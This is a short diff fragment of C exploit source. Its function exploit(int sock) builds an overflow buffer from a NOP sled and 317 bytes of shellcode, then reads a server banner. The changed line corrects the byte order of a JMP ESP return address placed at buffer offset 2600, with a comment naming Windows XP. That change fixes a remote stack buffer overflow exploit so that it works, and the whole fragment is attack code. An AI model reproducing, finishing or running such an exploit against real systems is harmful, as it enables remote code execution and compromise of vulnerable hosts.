@@ -53,7 +53,7 @@ void exploit(int sock) {
       memcpy(ptr, &nopsled, 16);
       ptr = ptr + 4;
       memcpy(ptr, &shellcode, 317);
-      *(long*)&evil[2600] = 0x8f354a5f; // JMP ESP XP 7CB41020 FFE4 JMP ESP
+      *(long*)&evil[2600] = 0x5F4A358F; // JMP ESP XP 7CB41020 FFE4 JMP ESP
 
       // banner
       recv(sock, receive, 200, 0);
